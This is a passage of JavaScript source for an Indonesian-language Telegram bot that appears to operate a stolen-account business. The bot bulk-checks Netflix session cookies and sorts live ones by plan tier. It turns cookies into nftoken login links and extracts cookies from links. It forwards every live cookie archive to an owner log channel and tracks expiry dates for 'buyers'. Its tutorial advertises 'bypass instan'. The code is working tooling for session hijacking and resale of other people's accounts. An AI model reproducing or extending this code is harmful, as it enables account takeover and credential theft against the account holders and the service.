        const summaryText = `<b>📊 BULK CHECKING COMPLETED</b>\n─────────────────────\n✅ <b>Total Cookies LIVE:</b> ${totalLive}\n  ├ 👑 Premium: ${premiumResults.length}\n  ├ 💳 Standard: ${standardResults.length}\n  ├ 🛡️ Basic/Mobile: ${basicResults.length + otherLiveResults.length}\n  ├ ⚠️ Hold Payment: ${holdPaymentResults.length}\n  └ 🔴 Member Cancel: ${memberCancelResults.length}\n❌ <b>Cookies DEAD:</b> ${deadResults.length}\n📦 <b>Total Diproses:</b> ${cookiesToProcess.length}\n\n💡 <i>Gunakan command <code>/satukan</code> untuk menggabungkan seluruh cookies Live berformat lengkap ke dalam 1 file!</i>`;
        await ctx.reply(summaryText, { parse_mode: 'HTML' });

        // --- OWNER LOG ARSIP ---
        try {
            const bulkLogText = `📢 <b>NEW CONVERT LOG (BULK)</b>\n👤 <b>Operator:</b> ${userDisplay}\n📦 <b>File Asal:</b> <code>${nameOfFile}</code>\n\n` + summaryText;
            await ctx.telegram.sendMessage(LOG_CHANNEL_ID, bulkLogText, { parse_mode: 'HTML' });
            
            if (premiumResults.length > 0) await ctx.telegram.sendDocument(LOG_CHANNEL_ID, { source: Buffer.from(premiumResults.join('\n'), 'utf8'), filename: 'PLAN_PREMIUM_LIVE.txt' }, { caption: `👑 Premium Live Archive (Owner Log)`, parse_mode: 'HTML' }).catch(() => {});
            if (standardResults.length > 0) await ctx.telegram.sendDocument(LOG_CHANNEL_ID, { source: Buffer.from(standardResults.join('\n'), 'utf8'), filename: 'PLAN_STANDARD_LIVE.txt' }, { caption: `💳 Standard Live Archive (Owner Log)`, parse_mode: 'HTML' }).catch(() => {});
            if (basicResults.length > 0) await ctx.telegram.sendDocument(LOG_CHANNEL_ID, { source: Buffer.from(basicResults.join('\n'), 'utf8'), filename: 'PLAN_BASIC_LIVE.txt' }, { caption: `🛡️ Basic Live Archive (Owner Log)`, parse_mode: 'HTML' }).catch(() => {});
            if (otherLiveResults.length > 0) await ctx.telegram.sendDocument(LOG_CHANNEL_ID, { source: Buffer.from(otherLiveResults.join('\n'), 'utf8'), filename: 'PLAN_MOBILE_LIVE.txt' }, { caption: `📱 Mobile/Other Live Archive (Owner Log)`, parse_mode: 'HTML' }).catch(() => {});
            if (holdPaymentResults.length > 0) await ctx.telegram.sendDocument(LOG_CHANNEL_ID, { source: Buffer.from(holdPaymentResults.join('\n'), 'utf8'), filename: 'STATUS_HOLD_PAYMENT.txt' }, { caption: `⚠️ Hold Payment Archive (Owner Log)`, parse_mode: 'HTML' }).catch(() => {});
            if (memberCancelResults.length > 0) await ctx.telegram.sendDocument(LOG_CHANNEL_ID, { source: Buffer.from(memberCancelResults.join('\n'), 'utf8'), filename: 'STATUS_MEMBER_CANCEL.txt' }, { caption: `🔴 Member Cancel Archive (Owner Log)`, parse_mode: 'HTML' }).catch(() => {});
        } catch (logErr) {
            console.error("⚠️ Gagal mengirim arsip bulk ke channel log:", logErr.message);
        }

        // =====================================================================
        // 🌟 MENGIRIM FILE HASIL SORTIR KE PENGGUNA SECARA LENGKAP
        // =====================================================================
        if (premiumResults.length > 0) {
            await ctx.replyWithDocument({ source: Buffer.from(premiumResults.join('\n'), 'utf8'), filename: 'PLAN_PREMIUM_LIVE.txt' }, { caption: `👑 <b>Premium Live (${premiumResults.length} Akun)</b>`, parse_mode: 'HTML' }).catch(() => {});
        }
        if (standardResults.length > 0) {
            await ctx.replyWithDocument({ source: Buffer.from(standardResults.join('\n'), 'utf8'), filename: 'PLAN_STANDARD_LIVE.txt' }, { caption: `💳 <b>Standard Live (${standardResults.length} Akun)</b>`, parse_mode: 'HTML' }).catch(() => {});
        }
        if (basicResults.length > 0) {
            await ctx.replyWithDocument({ source: Buffer.from(basicResults.join('\n'), 'utf8'), filename: 'PLAN_BASIC_LIVE.txt' }, { caption: `🛡️ <b>Basic Live (${basicResults.length} Akun)</b>`, parse_mode: 'HTML' }).catch(() => {});
        }
        if (otherLiveResults.length > 0) {
            await ctx.replyWithDocument({ source: Buffer.from(otherLiveResults.join('\n'), 'utf8'), filename: 'PLAN_MOBOLE/STANDART.txt' }, { caption: `📱 <b>Mobile/Standart Live (${otherLiveResults.length} Akun)</b>`, parse_mode: 'HTML' }).catch(() => {});
        }
        if (holdPaymentResults.length > 0) {
            await ctx.replyWithDocument({ source: Buffer.from(holdPaymentResults.join('\n'), 'utf8'), filename: 'STATUS_HOLD_PAYMENT.txt' }, { caption: `⚠️ <b>Hold Payment (${holdPaymentResults.length} Akun)</b>`, parse_mode: 'HTML' }).catch(() => {});
        }
        if (memberCancelResults.length > 0) {
            await ctx.replyWithDocument({ source: Buffer.from(memberCancelResults.join('\n'), 'utf8'), filename: 'STATUS_MEMBER_CANCEL.txt' }, { caption: `🔴 <b>Member Cancel (${memberCancelResults.length} Akun)</b>`, parse_mode: 'HTML' }).catch(() => {});
        }
        if (deadResults.length > 0) {
            await ctx.replyWithDocument({ source: Buffer.from(deadResults.join('\n'), 'utf8'), filename: 'COOKIES_MATI_DEAD.txt' }, { caption: `❌ <b>Semua Cookies Dead (${deadResults.length} Akun)</b>`, parse_mode: 'HTML' }).catch(() => {});
        }

    } catch (error) {
        ctx.reply(`⚠️ Terjadi kesalahan internal saat memproses berkas bulk: ${error.message}`);
    } finally {
        bot.context.ownerBulkWaiting = false; 
    }
});

bot.action(/retry_hit_(\d+)/, async (ctx) => {
    const sisaTarget = parseInt(ctx.match[1]);
    const currentUserId = ctx.from.id.toString();
    const usernameDisplay = ctx.from.username ? `@${ctx.from.username}` : ctx.from.first_name;
    
    // Cek double hit protection juga di tombol retry
    const isInQueue = hitQueue.some(task => task.userId === currentUserId);
    const isCurrentlyProcessing = currentTaskDetail && currentTaskDetail.userId === currentUserId;

    if (isInQueue || isCurrentlyProcessing) {
        return ctx.answerCbQuery('TOLAK: Kamu sudah ada di dalam antrean!', { show_alert: true });
    }

    ctx.answerCbQuery(`Memasukkan ulang sisa ${sisaTarget} target ke antrean...`, { show_alert: true });
    await ctx.editMessageReplyMarkup({ inline_keyboard: [] }).catch(()=>{});

    hitQueue.push({
        ctx: ctx,
        targetTotal: sisaTarget,
        userId: currentUserId,
        username: usernameDisplay
    });

    const queuePosition = hitQueue.length;

    if (isProcessingHit) {
        await ctx.reply(`⏳ <b>RETRY MASUK ANTREAN!</b>\nAntrian kamu ke: <b>${queuePosition}</b>\n<i>Mohon tunggu, gunakan /cekantrian untuk melihat posisi.</i>`, { parse_mode: 'HTML' });
    } else {
        processNextHit();
    }
});

// --- CALLBACK UNTUK FITUR EKSTRAK LINK DARI /HIT ---
bot.action(/extract_yes_(.+)/, async (ctx) => {
    const hitId = ctx.match[1];
    const links = hitCache.get(hitId);

    if (!links) {
        return ctx.answerCbQuery('❌ Sesi ekstrasi sudah kadaluarsa atau tidak ditemukan.', { show_alert: true });
    }

    ctx.answerCbQuery('Sedang mengekstrak cookies...', { show_alert: false });

    // Hapus tombol dan ubah caption menggunakan format HTML
    await ctx.editMessageCaption('📁 Berikut adalah hasil generate link.\n\n⏳ <b>Sedang mengekstrak link menjadi cookies, mohon tunggu...</b>', { parse_mode: 'HTML' }).catch(() => {});

    let liveCookiesResults = [];
    let deadLinksResults = [];

    // Proses konversi satu per satu pakai fungsi bawaan
    for (let link of links) {
        const cookieResult = await resolveLinkToCookie(link);
        if (cookieResult) {
            liveCookiesResults.push(cookieResult);
        } else {
            deadLinksResults.push(link);
        }
    }

    // Kirim hasil ekstrak dengan format HTML
    if (liveCookiesResults.length > 0) {
        const fileBuffer = Buffer.from(liveCookiesResults.join('\n'), 'utf8');
        await ctx.replyWithDocument(
            { source: fileBuffer, filename: 'EXTRACTED_COOKIES.txt' },
            { caption: `🍪 <b>Berhasil Ekstrak: ${liveCookiesResults.length} Cookies</b>\n❌ <b>Gagal/Expired: ${deadLinksResults.length} Link</b>\n\nSilahkan gunakan mode fitur convert cookies to link ke bot @corvastcookie_bot agar akun disortir oleh bot.`, parse_mode: 'HTML' }
        );
    } else {
        await ctx.reply(`❌ <b>Semua link gagal diekstrak atau sudah expired.</b>`, { parse_mode: 'HTML' });
    }

    hitCache.delete(hitId); // Bersihkan cache biar irit RAM
});

bot.action(/extract_no_(.+)/, async (ctx) => {
    const hitId = ctx.match[1];
    hitCache.delete(hitId);
    
    ctx.answerCbQuery('👌 Ekstrak cookies dibatalkan.');
    await ctx.editMessageCaption('📁 Berikut adalah hasil generate link.\n\n*🚫 Ekstrak cookies dibatalkan.*', { parse_mode: 'Markdown' }).catch(() => {});
});

// --- CALLBACK ACTIONS UNTUK INTERFACE MENU ---
bot.action('btn_leaderboard', async (ctx) => {
    ctx.answerCbQuery("Loading Leaderboard...", { show_alert: false });
    let users = loadUsers();
    users.sort((a, b) => (b.count || 0) - (a.count || 0));
    let topTen = users.slice(0, 10);
    let textLeaderboard = `<b>🏆 TOP 10 RANKING CONVERTER CORVAST STORE</b>\n─────────────────────────────\n`;
    const medalEmojis = ["🥇", "🥈", "🥉", "4️⃣", "5️⃣", "6️⃣", "7️⃣", "8️⃣", "9️⃣", "🔟"];
    if (topTen.length === 0) textLeaderboard += `<i>Belum ada data kompetisi.</i>\n`;
    else topTen.forEach((user, idx) => { textLeaderboard += `${medalEmojis[idx]} <b>${user.username}</b> — <code>${user.count || 0} Cookies</code>\n`; });
    let myRank = users.findIndex(u => u.id === ctx.from.id);
    textLeaderboard += `─────────────────────────────\n📊 <b>Peringkat Anda:</b> ${myRank !== -1 ? `#${myRank + 1}` : 'Belum Terdaftar'} (${myRank !== -1 ? (users[myRank].count || 0) : 0} Cookies)`;
    ctx.reply(textLeaderboard, { parse_mode: 'HTML' });
});

bot.action(/copy_(pc|app|tv)_(.+)/, async (ctx) => {
    const platform = ctx.match[1];
    const tokenId = ctx.match[2];
    const cachedData = tokenCache.get(tokenId);
    if (!cachedData) return ctx.answerCbQuery("❌ Token expired atau invalid.", { show_alert: true });
    let finalLink = '';
    if (platform === 'pc') finalLink = `https://www.netflix.com/account?nftoken=${cachedData.token}`;
    else if (platform === 'app') finalLink = `https://netflix.com/unsupported?nftoken=${cachedData.token}`;
    else if (platform === 'tv') finalLink = `https://netflix.com/tv8?nftoken=${cachedData.token}`;
    ctx.answerCbQuery(); 
    ctx.reply(`📋 *Link Login Siap Disalin:*\n\n\`${finalLink}\``, { parse_mode: 'Markdown' });
});

// Callback untuk menu "Pilih Mode Convert"
bot.action('btn_mode_convert', async (ctx) => {
    ctx.answerCbQuery();
    const modeText = `⚙️ <b>SILAKAN PILIH MODE CONVERT</b>\n\n` +
                     `Pilih metode konversi di bawah ini sesuai dengan kebutuhan data yang kamu miliki:`;
    
    ctx.reply(modeText, {
        parse_mode: 'HTML',
        ...Markup.inlineKeyboard([
            [Markup.button.callback('🔄 Convert Link to Link', 'mode_link_to_link')],
            [Markup.button.callback('🍪 Convert Link to Cookies', 'mode_link_to_cookies')],
            [Markup.button.callback('🔗 Convert Cookies to Link', 'mode_cookies_to_link')]
        ])
    });
});

// SISTEM MENGUBAH DATABASE SEMENTARA (MEMORY MODE)
bot.action('mode_link_to_link', async (ctx) => {
    activeConvertModes.set(ctx.from.id, 'LINK_TO_LINK'); // Simpan Mode
    ctx.answerCbQuery();
    ctx.reply(`🟢 <b>Mode Active: Link to Link</b>\n\n👉 <i>Silakan langsung paste/kirimkan tautan Netflix Token Anda ke bot untuk memperbarui struktur tujuannya secara otomatis!</i>`, { parse_mode: 'HTML' });
});

bot.action('mode_link_to_cookies', async (ctx) => {
    activeConvertModes.set(ctx.from.id, 'LINK_TO_COOKIES'); // Simpan Mode
    ctx.answerCbQuery();
    ctx.reply(`🟢 <b>Mode Active: Link to Cookies</b>\n\n👉 <i>Silakan kirimkan tautan Netflix token Anda untuk diekstrak menjadi data cookies mentah!</i>`, { parse_mode: 'HTML' });
});

bot.action('mode_cookies_to_link', async (ctx) => {
    activeConvertModes.set(ctx.from.id, 'COOKIES_TO_LINK'); // Simpan Mode (Default)
    ctx.answerCbQuery();
    ctx.reply(`🟢 <b>Mode Active: Cookies to Link</b>\n\n👉 <i>Silakan paste teks cookies Anda atau drop file .txt / .zip bulk ke sini!</i>`, { parse_mode: 'HTML' });
});

bot.action('btn_tutorial', async (ctx) => { ctx.answerCbQuery(); ctx.reply(`📖 <b>Tutorial Login:</b>\n\n1. Pilih Mode dari menu /start.\n2. Kirim berkas/data/link sesuai mode yang aktif.\n3. Salin hasil convert terbaru dan nikmati bypass instan!`, { parse_mode: 'HTML' }); });

// --- TIMER REMINDER INTERVAL PEMBELI ---
setInterval(async () => {
    try {
        let pembeliList = loadPembeli();
        if (pembeliList.length === 0) return;
        const now = new Date();
        let remainingPembeli = [], expiredPembeli = [];
        for (let buyer of pembeliList) {
            if (now >= new Date(buyer.expiredAt)) expiredPembeli.push(buyer);
            else remainingPembeli.push(buyer);
        }
        if (expiredPembeli.length > 0) {
            savePembeli(remainingPembeli); 
            for (let expUser of expiredPembeli) {
                const messageReminder = `<b>REMINDER LOGOUT</b>\n──────────────────────────\n👤 <b>Data Buyer:</b> <code>${expUser.buyer}</code>\n❌ <b>Status Waktu:</b> HABIS / EXPIRED 🔴\n──────────────────────────\n📢 <i>Mohon infokan buyer di atas untuk melakukan LOGOUT sekarang.</i>`;
                await bot.telegram.sendMessage(REMINDER_CHANNEL_ID, messageReminder, { parse_mode: 'HTML' });
            }
        }
    } catch (err) { console.error("⚠️ Gagal memproses interval reminder pembeli:", err.message); }
}, 60 * 60 * 1000); 

bot.catch((err, ctx) => {
    console.error(`[Global Error] ⚠️ Terjadi kesalahan background:`, err.message);
});

async function startBotWithRetry() {
    try {
        console.log('⏳ Menghubungkan ke Telegram API...');
        await bot.launch({ polling: { timeout: 30 } });
        console.log('✅ Bot is actively listening via Polling mode.');
    } catch (err) {
        console.error('❌ Gagal meluncurkan bot:', err.message);
        setTimeout(startBotWithRetry, 5000); 
    }
}
startBotWithRetry();
process.on('unhandledRejection', (reason, p) => { console.log('⚠️ Unhandled Rejection at:', p, 'reason:', reason); });
